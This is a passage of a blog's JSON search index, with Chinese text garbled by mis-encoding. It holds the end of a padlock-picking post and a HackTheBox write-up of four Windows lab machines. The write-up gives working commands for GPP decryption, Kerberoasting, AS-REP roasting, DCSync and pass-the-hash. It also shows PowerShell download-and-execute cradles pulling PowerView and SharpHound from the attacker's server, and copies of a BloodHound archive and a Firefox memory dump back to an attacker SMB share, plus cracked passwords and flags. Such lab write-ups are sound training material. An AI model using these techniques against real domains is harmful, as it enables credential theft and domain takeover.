è¿™ä¸ªæƒ…å†µæ˜¯åŸºäºæ‰‹å¤´ä¸Šçš„ä¸€ä¸ªé”å…·ï¼Œçºµå‘åˆ†å¸ƒä¸¤ç»„æ‹¨çˆªï¼Œåˆ†åˆ«å¯¹åº”ä¸¤ä¾§çš„é”èˆŒ ä½¿ç”¨é’¥åŒ™å¼€é”æ—¶ï¼Œé¡ºæ—¶é’ˆè½¬åŠ¨é”èŠ¯å¸¦åŠ¨ä¸¤ç»„æ‹¨çˆªï¼Œä½¿ä¸¤ä¸ªé”èˆŒå¯¹å‘ç§»åŠ¨ï¼Œä»è€Œè§£é” å¦‚æœæ˜¯è¿™ç§æƒ…å†µçš„è¯ï¼Œå•çº¯åœ°å°†é”èˆŒå‘å³æ’¬åªä¼šå¡ä½é”æ¢çš„å³è¾¹ ç ´è§£æ–¹æ³• ç”±äºæœ‰ä¸¤ç»„æ‹¨çˆªï¼Œéœ€è¦å…ˆæ’¬åŠ¨å³è¾¹çš„é”èˆŒï¼Œé”æ¢ä¼šåœ¨å¼¹ç°§Açš„ä½œç”¨ä¸‹å‘ä¸Šç§»åŠ¨ï¼Œæ­¤æ—¶é”æ¢å³ä¾§ä¸å—é”èˆŒé™åˆ¶ï¼Œä½†é”æ¢å·¦è¾¹ä¼šè¢«é™åˆ¶ï¼Œä¹‹åçš„æ­¥éª¤å°±ä¸å¿…å¤šè¨€ ç”±äºå¼€é”ç±»ä¼¼äºé»‘ç›’æµ‹è¯•ï¼Œæ— æ³•çœ‹åˆ°é”çš„å†…éƒ¨ç»“æ„ï¼Œæ‰€ä»¥åªèƒ½æ”¶é›†ä¸€äº›ä¿¡æ¯æ¥æ¨æ–­æ˜¯å¦ä¸ºåŒå‘é”èˆŒ å¦‚æœåœ¨å°è¯•å‘å³æ’¬åŠ¨é”èˆŒåä¸èƒ½å¼€é”ï¼Œåˆ™éœ€è¦è€ƒè™‘åŒå‘é”èˆŒçš„æƒ…å†µ å‘å·¦æ’¬åŠ¨é”èˆŒï¼Œå³ä¾§é”æ¢ä¼šå‘ä¸Šç¨å¾®ç§»åŠ¨ä¸€äº›è·ç¦»ï¼Œæ‘ä¸‹åæœ‰æ¸…è„†çš„é‡‘å±æ’å‡»å£°ï¼Œåˆ™ä¸ºåŒå‘é”èˆŒ Method 1 æ¨¡æ‹Ÿé’¥åŒ™ è¿™ä¸ªåŸºæœ¬æ˜¯é€šç”¨çš„æ–¹æ³•ï¼Œä¹Ÿæ˜¯æœ€é æŠ€æœ¯çš„æ–¹æ³•ï¼Œå…ˆç”¨æŒ‘å‹¾å°†æˆªçº¿å¯¹é½ï¼Œç„¶åç”¨é“ç‰‡è½¬åŠ¨é”èŠ¯ å…¶éš¾åº¦ä¸å¼¹å­æ•°æˆæ­£ç›¸å…³ Method 2 æ¨è¿›é”èˆŒ å‚è€ƒä»¥ä¸‹è§†é¢‘ https://www.youtube.com/watch?v=BEOWb68YumY Method 3 å¼ºåˆ¶ç ´å ä½¿ç”¨ä¸¤ä¸ªæ‰³æ‰‹æ’å…¥é”æ¢ï¼Œä½¿ç”¨æ æ†åŸç†æ¥ç ´åé”ä½“ å†™åˆ°æœ€åå‘ç°è¿™äº›ä¸œè¥¿è·ŸWebå®‰å…¨åœ¨æŸäº›è§’åº¦æ˜¯ç›¸é€šçš„ å…ˆæ‹†å¸æ‰é”ï¼Œç„¶åè§‚å¯Ÿç»“æ„ï¼Œå†å»åˆ†æå¼€é”çš„æ–¹æ³•ï¼Œå°±ä¸ç™½ç›’å¯¹åº” ç›´æ¥å¼€é”å°±åƒé»‘ç›’ æˆ‘æƒ³ï¼Œæˆ–è®¸è¿™ç§å®‰å…¨çš„å…±é€šæ€§å€¼å¾—æˆ‘èŠ±ä¸€ç”Ÿçš„æ—¶é—´å»è¿½æ±‚ä¸æ¢ç´¢ å‚è€ƒ æŒ‚é”çš„ç»“æ„æ˜¯æ€æ ·çš„ æ™®é€šæŒ‚é”ç»“æ„å›¾è¯¦ç»†ç§‘æ™® æ•™ä½ å¦‚ä½•æ‰“å¼€ä¸€æŠŠå¼¹å­é” ç”¨äº†è¿™ä¹ˆå¤šå¹´æŒ‚é”ï¼Œä½ çŸ¥é“é”æ˜¯æ€ä¹ˆè¿è½¬çš„å—ï¼Ÿ ç»´åŸºç™¾ç§‘ Open Lock with Soda Can","categories":[{"name":"Talk","slug":"Talk","permalink":"https://yoloyolo.top/categories/Talk/"}],"tags":[{"name":"Lock_Picking","slug":"Lock-Picking","permalink":"https://yoloyolo.top/tags/Lock-Picking/"}]},{"title":"HackTheBox_Windows_Set_1","slug":"HackTheBox-Windows-Set-1","date":"2021-07-04T21:09:07.000Z","updated":"2023-02-14T15:38:04.000Z","comments":true,"path":"2021/07/04/HackTheBox-Windows-Set-1/","link":"","permalink":"https://yoloyolo.top/2021/07/04/HackTheBox-Windows-Set-1/","excerpt":"HackTheBoxè¿”åœºäº†å‡ å°Windowsçš„é¶æœº ç¡®å®šäº†æš‘å‡çš„å®ä¹  è€ƒè¯•å‘¨çš„è€ƒè¯•å®‰æ’å¾—é å æ­£å·§","text":"HackTheBoxè¿”åœºäº†å‡ å°Windowsçš„é¶æœº ç¡®å®šäº†æš‘å‡çš„å®ä¹  è€ƒè¯•å‘¨çš„è€ƒè¯•å®‰æ’å¾—é å æ­£å·§ HackTheBox_Active ç«¯å£æ‰«æ 12345678910111213141516171819202122232425nmap -sV -sT -Pn 10.10.10.100Nmap scan report for 10.10.10.100Host is up (0.59s latency).Not shown: 982 closed portsPORT STATE SERVICE VERSION53/tcp open domain Microsoft DNS 6.1.760188/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-07-04 09:21:59Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)3269/tcp open tcpwrapped3389/tcp open ms-wbt-server Microsoft Terminal Service49152/tcp open msrpc Microsoft Windows RPC49153/tcp open msrpc Microsoft Windows RPC49154/tcp open msrpc Microsoft Windows RPC49155/tcp open msrpc Microsoft Windows RPC49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049158/tcp open msrpc Microsoft Windows RPCService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows æ¼æ´åˆ©ç”¨ å¼€äº†53ç«¯å£ï¼ŒåŸºæœ¬ç¡®å®šæ˜¯å°DC 12345678910111213141516171819202122232425262728293031323334353637383940414243enum4linux 10.10.10.100 ========================== | Target Information | ========================== Target ........... 10.10.10.100RID Range ........ 500-550,1000-1050Username ......... &#x27;&#x27;Password ......... &#x27;&#x27;Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none------ ====================================== | OS information on 10.10.10.100 | ====================================== Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.[+] Got OS info for 10.10.10.100 from smbclient: Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.[+] Got OS info for 10.10.10.100 from srvinfo: 10.10.10.100 Wk Sv PDC Tim NT Domain Controller platform_id : 500 os version : 6.1 server type : 0x80102b------ ========================================= | Share Enumeration on 10.10.10.100 | ========================================= Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640. Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin attacker_folder Disk C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share Replication Disk SYSVOL Disk Logon server share Users Disk åº”è¯¥å¯ä»¥åŒ¿åç™»å½• 123456789101112smbmap -H 10.10.10.100 Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin attacker_folder NO ACCESS C$ NO ACCESS Default share IPC$ NO ACCESS Remote IPC NETLOGON NO ACCESS Logon server share Replication READ ONLY SYSVOL NO ACCESS Logon server share Users NO ACCESS ä¸‹è½½æ•´ä¸ªæ–‡ä»¶å¤¹ 12345smbclient //10.10.10.100/Replicationmask &quot;&quot;recurse ONprompt OFFmget active.htb æ‹¿åˆ°GPPå¯†æ–‡å¯†ç  12345cat active.htb/Policies/&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;/MACHINE/Preferences/Groups&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;Groups clsid=&quot;&#123;3125E937-EB16-4b4c-9934-544FC6D24D26&#125;&quot;&gt;&lt;User clsid=&quot;&#123;DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1&#125;&quot; name=&quot;active.htb\\SVC_TGS&quot; image=&quot;2&quot; changed=&quot;2018-07-18 20:46:06&quot; uid=&quot;&#123;EF57DA28-5F69-4530-A59E-AAB58578219D&#125;&quot;&gt;&lt;Properties action=&quot;U&quot; newName=&quot;&quot; fullName=&quot;&quot; description=&quot;&quot; cpassword=&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot; changeLogon=&quot;0&quot; noChange=&quot;1&quot; neverExpires=&quot;1&quot; acctDisabled=&quot;0&quot; userName=&quot;active.htb\\SVC_TGS&quot;/&gt;&lt;/User&gt;&lt;/Groups&gt; è§£å¯†å¾—åˆ°æ˜æ–‡å¯†ç  12gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQGPPstillStandingStrong2k18 è¿™é‡Œæœ¬æ¥ä»¥ä¸ºæ˜¯ç”¨evil-winrmæˆ–è€…psexecGetshellçš„ï¼Œæ²¡æƒ³åˆ°æ˜¯smbç™»å…¥users 12345smbclient //10.10.10.100/Users -U active.htb/SVC_TGS%GPPstillStandingStrong2k18get svc_tgs\\desktop\\user.txtcat svc_tgs\\\\desktop\\\\user.txt 86d67d8ba232bb6a254aa4d10159e983 æƒé™æå‡ Kerberoasting 1python GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile getuserspns.out ï¼ˆè·‘çš„æ—¶å€™å‡ºäº†ä¸ªæ—¶é—´å·®è¿‡å¤§çš„é”™è¯¯ï¼Œå¤´ç–¼ï¼‰ åŒæ­¥æ—¶é—´ 1ntpdate -u 10.10.10.100 çˆ†ç ´ç¥¨æ® 123john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs getuserspns.out Ticketmaster1968 (?) æŸ¥çœ‹SMBè·¯å¾„æƒé™ 123456789101112smbmap -H 10.10.10.100 -u administrator -p Ticketmaster1968 Disk Permissions Comment ---- ----------- ------- ADMIN$ READ, WRITE Remote Admin attacker_folder READ, WRITE C$ READ, WRITE Default share IPC$ NO ACCESS Remote IPC NETLOGON READ, WRITE Logon server share Replication READ ONLY SYSVOL READ, WRITE Logon server share Users æœ‰å†™æƒé™ï¼Œç›´æ¥psexec 12345python psexec.py active.htb/administrator@10.10.10.100Ticketmaster1968type \\users\\administrator\\desktop\\root.txtb5fc76d1d6b91d77b2fbf2d54d0f708b HackTheBox_Bastion ç«¯å£æ‰«æ 1234567891011nmap -sV -sT -Pn 10.10.10.134Nmap scan report for 10.10.10.134Host is up (0.59s latency).Not shown: 996 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH for_Windows_7.9 (protocol 2.0)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-dsService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows HackTheBox_æ¼æ´åˆ©ç”¨ smbmapæ‰«æè·¯å¾„ 1234567smbmap -H 10.10.10.134 -u test Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin Backups READ, WRITE C$ NO ACCESS Default share IPC$ READ ONLY Remote IPC å¯ä»¥çœ‹åˆ°æœ‰ä¸¤ä¸ªVHDæ–‡ä»¶ 1234567891011121314151617181920smbclient //10.10.10.134/backupsdir WindowsImageBackup\\L4mpje-PC\\&quot;Backup 2019-02-22 124351&quot;\\ . Dn 0 Fri Feb 22 20:45:32 2019 .. Dn 0 Fri Feb 22 20:45:32 2019 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd An 37761024 Fri Feb 22 20:44:03 2019 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd An 5418299392 Fri Feb 22 20:45:32 2019 BackupSpecs.xml An 1186 Fri Feb 22 20:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml An 1078 Fri Feb 22 20:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml An 8930 Fri Feb 22 20:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml An 6542 Fri Feb 22 20:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml An 2894 Fri Feb 22 20:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml An 1488 Fri Feb 22 20:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml An 1484 Fri Feb 22 20:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml An 3844 Fri Feb 22 20:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml An 3988 Fri Feb 22 20:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml An 7110 Fri Feb 22 20:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml An 2374620 Fri Feb 22 20:45:32 2019 7735807 blocks of size 4096. 2757267 blocks available å…ˆæŒ‚è½½SMBæœåŠ¡çš„æ–‡ä»¶ï¼Œå†å°†VHDæ–‡ä»¶æŒ‚è½½åˆ°æœ¬åœ°ç£ç›˜ 123456mkdir /tmp/vhdmkdir /tmp/l4mpje-pcmount -t cifs //10.10.10.134/backups/WindowsImageBackup/L4mpje-PC /tmp/l4mpje-pc/ -o user=anonymousmodprobe nbd max_part=16qemu-nbd -r -c /dev/nbd0 &quot;/tmp/l4mpje-pc/Backup 2019-02-22 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd&quot;mount -r /dev/nbd0p1 /tmp/vhd å¤åˆ¶SAMæ–‡ä»¶å’ŒSYSTEMæ–‡ä»¶ 12cp /tmp/vhd/Windows/System32/config/SYSTEM /root/cp /tmp/vhd/Windows/System32/config/SAM /root/ å–æ¶ˆæŒ‚è½½ 1234umount /tmp/vhdqemu-nbd -d /dev/nbd0rmmod nbdumount /tmp/l4mpje-pc dumpå‡ºHash 12345678python secretsdump.py local -system /root/SYSTEM -sam /root/SAM[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::[*] Cleaning up... è§£å¯†å¾—åˆ°æ˜æ–‡ 123john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT hashbureaulampje (?) SSHç™»å…¥ 12345ssh L4mpje@10.10.10.134bureaulampjetype Desktop\\user.txt 9bfe57d5c3309db3a151772f9d86c6cd æƒé™æå‡ æ‰¾åˆ°mRemoteNGç¨‹åºçš„å‡­è¯å‚¨å­˜ 123type \\Users\\L4mpje\\AppData\\Roaming\\mRemoteNG\\confCons.xmlUsername=&quot;Administrator&quot; Domain=&quot;&quot; Password=&quot;aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==&quot; è¿˜åŸç®¡ç†å‘˜å£ä»¤ 1234wget https://raw.githubusercontent.com/kmahyyg/mremoteng-decrypt/master/mremoteng_decrypt.pypython mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==Password: thXLHM96BeKL0ER2 sshç™»å…¥ 12345ssh administrator@10.10.10.134thXLHM96BeKL0ER2type \\Users\\Administrator\\Desktop\\root.txt 958850b91811676ed6620a9c430e65c8 HackTheBox_Forest ç«¯å£æ‰«æ 123456789101112131415161718nmap -sV -sT -Pn 10.10.10.161Nmap scan report for 10.10.10.161Host is up (0.081s latency).Not shown: 989 closed portsPORT STATE SERVICE VERSION53/tcp open domain Microsoft DNS88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-07-05 14:34:46Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)3269/tcp open tcpwrappedService Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows æ¼æ´åˆ©ç”¨ è¿˜æ˜¯DC è·‘å‡ºæ¥åŸŸåå’Œä¸€äº›ç”¨æˆ·å 123456789101112131415161718192021222324252627282930313233343536373839404142434445enum4linux 10.10.10.161 =========================================== | Getting domain SID for 10.10.10.161 | =========================================== Domain Name: HTBDomain Sid: S-1-5-21-3072663084-364016917-1341370565[+] Host is part of a domain (not a workgroup)----- ============================= | Users on 10.10.10.161 | ============================= user:[Administrator] rid:[0x1f4]user:[Guest] rid:[0x1f5]user:[krbtgt] rid:[0x1f6]user:[DefaultAccount] rid:[0x1f7]user:[$331000-VK4ADACQNUCA] rid:[0x463]user:[SM_2c8eef0a09b545acb] rid:[0x464]user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]user:[SM_75a538d3025e4db9a] rid:[0x466]user:[SM_681f53d4942840e18] rid:[0x467]user:[SM_1b41c9286325456bb] rid:[0x468]user:[SM_9b69f1b9d2cc45549] rid:[0x469]user:[SM_7c96b981967141ebb] rid:[0x46a]user:[SM_c75ee099d0a64c91b] rid:[0x46b]user:[SM_1ffab36a2f5f479cb] rid:[0x46c]user:[HealthMailboxc3d7722] rid:[0x46e]user:[HealthMailboxfc9daad] rid:[0x46f]user:[HealthMailboxc0a90c9] rid:[0x470]user:[HealthMailbox670628e] rid:[0x471]user:[HealthMailbox968e74d] rid:[0x472]user:[HealthMailbox6ded678] rid:[0x473]user:[HealthMailbox83d6781] rid:[0x474]user:[HealthMailboxfd87238] rid:[0x475]user:[HealthMailboxb01ac64] rid:[0x476]user:[HealthMailbox7108a4e] rid:[0x477]user:[HealthMailbox0659cc1] rid:[0x478]user:[sebastien] rid:[0x479]user:[lucinda] rid:[0x47a]user:[svc-alfresco] rid:[0x47b]user:[andy] rid:[0x47e]user:[mark] rid:[0x47f]user:[santi] rid:[0x480] Typically that requires credentials on the domain to authenticate with. There is an option for an account to have the property â€œDo not require Kerberos preauthenticationâ€ or UF_DONT_REQUIRE_PREAUTH set to true. AS-REP Roasting is an attack against Kerberos for these accounts. https://0xdf.gitlab.io/2020/03/21/htb-forest.html#as-rep-roasting AS-REP Roasting 12345python GetNPUsers.py HTB/svc-alfresco -request -no-pass -dc-ip 10.10.10.161Impacket v0.9.23.dev1 - Copyright 2020 SecureAuth Corporation[*] Getting TGT for svc-alfresco$krb5asrep$23$svc-alfresco@HTB:74aacc88dcebdc99fbdfad38ea7bfb86$0f390178e508b52f3547f4784f435ca5955e6086b719aab1723ec0d13c900d4b0b7e4a00c10162b5615fb8c93e90f34a1746b5de60400cac0a2eae9ecab1a1d16f1d41958d72811ba73835e3177ea538e77888a207a47537c83644879fa792b5d31b965dd75aef7409dc34ba0b2df67eb987db6779846f330d563277f97e004484f67e7a853beec8e7552b427ac4c43fabd3f523a365f80a43f90f587ee08bbc8d06ad907d9efc5a6541714f92fe3c7626dd539daa45d54a4ef5733579277c65f7d11ca380184131a767428ca62077e4553fd8d86d1e7340da4b41b115357485 çˆ†ç ´å£ä»¤æ˜æ–‡ 123john --wordlist=/usr/share/wordlists/rockyou.txt hashs3rvice ($krb5asrep$23$svc-alfresco@HTB) evil-winrmç™»å…¥ 1234evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvicetype C:\\users\\svc-alfresco\\desktop\\user.txte5e4e47ae7022664cda6eb013fb0d9ed æƒé™æå‡ ä¸‹è½½bloodhoundçš„powershellç‰ˆæœ¬çš„collectorï¼Œå¼€å¯HTTPæœåŠ¡å’ŒSMBæœåŠ¡(impacket) 1234wget https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1python -m http.server 9998&amp;python smbserver.py Bufferfly . -smb2support -username Buffer -password fly&amp; é¶æœºä¸Šä¸‹è½½bloodhound collectorå¹¶å›ä¼ è¾“å‡ºæ–‡ä»¶ 1234567iex(new-object net.webclient).downloadstring(&quot;http://10.10.16.11:9998/PowerView.ps1&quot;)iex(new-object net.webclient).downloadstring(&quot;http://10.10.16.11:9998/SharpHound.ps1&quot;)powershell -exec bypassinvoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvicenet use \\\\10.10.16.11\\Bufferfly /u:Buffer flycopy 20210705223815_BloodHound.zip \\\\10.10.16.11\\Bufferfly\\net use /d \\\\10.10.16.11\\Bufferfly bloodhoundçš„å†…å®¹å®åœ¨æ˜¯çœ‹ä¸æ‡‚ï¼Œçœ‹äº†WP å¤§æ¦‚æ€è·¯æ˜¯ ç”¨æˆ·&quot;svc-alfresco&quot;æ‹¥æœ‰è´¦æˆ·æ“ä½œæƒé™ï¼Œå¯ä»¥åˆ›å»ºåŸŸè´¦æˆ· ç”¨æˆ·&quot;svc-alfresco&quot;å®Œå…¨æ§åˆ¶&quot;Exchange Windows Permissions&quot;ç»„(GenericAll)ï¼Œå¯ä»¥å°†&quot;svc-alfresco&quot;åŠ å…¥&quot;Exchange Windows Permissions&quot;ç»„ &quot;Exchange Windows Permissions&quot;ç»„å¯ä»¥ä¿®æ”¹åŸŸç”¨æˆ·çš„ACL(WriteDacl) ç”¨æˆ·&quot;svc-alfresco&quot;åˆ©ç”¨&quot;Exchange Windows Permissions&quot;ç»„çš„æƒé™èµ‹äºˆ&quot;DCSync&quot;æƒé™ åˆ©ç”¨è¿™ä¸ªåŸŸè´¦æˆ·è¿›è¡ŒDCSyncæ”»å‡» æ·»åŠ åŸŸç”¨æˆ· 1net user bufferfly bufferfly /add /domain æ‰§è¡Œå‘½ä»¤åé‡æ–°Getshell 1Add-ADGroupMember -Identity &quot;Exchange Windows Permissions&quot; -Members svc-alfresco æŸ¥çœ‹ç»„ 1234whoami /groupsHTB\\Exchange Windows Permissions Group S-1-5-21-3072663084-364016917-1341370565-1121 Mandatory group, Enabled by default, Enabled groupHTB\\Exchange Trusted Subsystem Group S-1-5-21-3072663084-364016917-1341370565-1119 Mandatory group, Enabled by default, Enabled grou æ·»åŠ DCSyncæƒé™(PowerView.ps1) 1Add-DomainObjectAcl -TargetIdentity &quot;DC=htb,DC=local&quot; -PrincipalIdentity bufferfly -Rights DCSync DCSyncæ”»å‡» 123python secretsdump.py -just-dc &quot;htb/bufferfly:bufferfly@10.10.10.161&quot;htb.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6::: Hashç™»å…¥ 1234evil-winrm -i 10.10.10.161 -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6type c:\\users\\administrator\\desktop\\root.txtf048153f202bbb2f82622b04d79129cc è²Œä¼¼svc-alfrescoä¸æ˜¯åŸŸç”¨æˆ·ï¼Œè€ŒDCSyncçš„æ“ä½œéœ€è¦ä¸€ä¸ªåŸŸç”¨æˆ·çš„å‡­è¯ Powershellåœ¨è¿è¡Œå‘½ä»¤æ—¶è²Œä¼¼ä¼šè‡ªåŠ¨åœ°ä»ps1æ–‡ä»¶è½½å…¥å‡½æ•°ï¼Œå¾ˆæ–¹ä¾¿ HackTheBox_Heist ç«¯å£æ‰«æ 12345678910nmap -sV -sT -Pn 10.10.10.149Nmap scan report for 10.10.10.149Host is up (0.24s latency).Not shown: 997 filtered portsPORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 10.0135/tcp open msrpc Microsoft Windows RPC445/tcp open microsoft-ds?Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows æ¼æ´åˆ©ç”¨ è®¿é—®http://10.10.10.149/attachments/config.txt ciscoçš„å¯†ç å¯ä»¥åœ¨çº¿ç ´è§£(https://www.ifm.net.nz/cookbooks/passwordcracker.html) md5ç›´æ¥johnçˆ†ç ´ å¾—åˆ°ä¸€äº›è´¦æˆ· 123rout3r:$uperP@sswordadmin:Q4)sJu\\Y8qz*A3?dsecret:stealth1agent æµ‹è¯•hazardçš„å¯†ç (ç”±äºæœªçŸ¥åŸå› ï¼Œhydraä¸èƒ½çˆ†ç ´SMB) 1234567smbmap -H 10.10.10.149 -u hazard -p stealth1agent Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share IPC$ READ ONLY Remote IPC æšä¸¾åŸŸè´¦æˆ·ä¿¡æ¯ 1234567891011python lookupsid.py hazard:stealth1agent@heist500: SUPPORTDESK\\Administrator (SidTypeUser)501: SUPPORTDESK\\Guest (SidTypeUser)503: SUPPORTDESK\\DefaultAccount (SidTypeUser)504: SUPPORTDESK\\WDAGUtilityAccount (SidTypeUser)513: SUPPORTDESK\\None (SidTypeGroup)1008: SUPPORTDESK\\Hazard (SidTypeUser)1009: SUPPORTDESK\\support (SidTypeUser)1012: SUPPORTDESK\\Chase (SidTypeUser)1013: SUPPORTDESK\\Jason (SidTypeUser) å­—å…¸ 12345678910111213141516cat userhazardadministratoradminrout3radminsecretsupportChase------cat pass$uperP@sswordQ4)sJu\\Y8qz*A3?dstealth1agent çˆ†ç ´winrmæœåŠ¡ 123crackmapexec winrm 10.10.10.149 -d heist -u user -p passWINRM 10.10.10.149 5985 10.10.10.149 [+] heist\\Chase:Q4)sJu\\Y8qz*A3?d (Pwn3d!) winrmç™»å…¥ 1234evil-winrm -i 10.10.10.149 -u chase -p &quot;Q4)sJu\\Y8qz*A3?d&quot;type c:\\users\\chase\\desktop\\user.txta127daef77ab6d9d92008653295f59c4 æƒé™æå‡ æŸ¥çœ‹è¿›ç¨‹ 1234567ps 378 28 25008 62440 1.16 6216 1 firefox 355 25 16444 38908 0.27 6564 1 firefox 1050 73 172600 248916 13.88 6732 1 firefox 347 19 9972 34476 0.23 6844 1 firefox 401 34 40728 101244 3.31 6956 1 firefox å¯ä»¥çœ‹çœ‹firefoxè¿›ç¨‹å†…å­˜ å¼€å¯HTTPæœåŠ¡ä¸SMBæœåŠ¡ 12python -m http.server 9998&amp;python smbserver.py Bufferfly . -smb2support -username Buffer -password fly&amp; ä¸Šä¼ procdumpå¹¶å›ä¼ firefoxè¿›ç¨‹å†…å­˜ 12345wget -uri http://10.10.16.14:9998/procdump64.exe -outfile procdump64.exe./procdump64.exe -accepteula -ma 6216net use \\\\10.10.16.14\\Bufferfly /u:Buffer flycopy firefox.exe_210706_221007.dmp \\\\10.10.16.14\\Bufferfly\\net use /d \\\\10.10.16.14\\Bufferfly æŸ¥æ‰¾adminç›¸å…³ä¿¡æ¯ 123grep -a admin firefox.exe_210706_221007.dmplocalhost/login.php?login_username=admin@support.htb&amp;login_password=4dD!5&#125;x/re8]FBuZ wimrmç™»å…¥ 1234evil-winrm -i 10.10.10.149 -u administrator -p &#x27;4dD!5&#125;x/re8]FBuZ&#x27;type c:\\users\\administrator\\desktop\\root.txt50dfa3c6bfd20e2e0d071b073d766897 è¿˜æ˜¯æ²¡æƒ³é€šä¸ºå•¥hydraçˆ†ä¸äº†smbï¼Œä»¥åæœ‰æœºä¼šå†è¯•è¯• 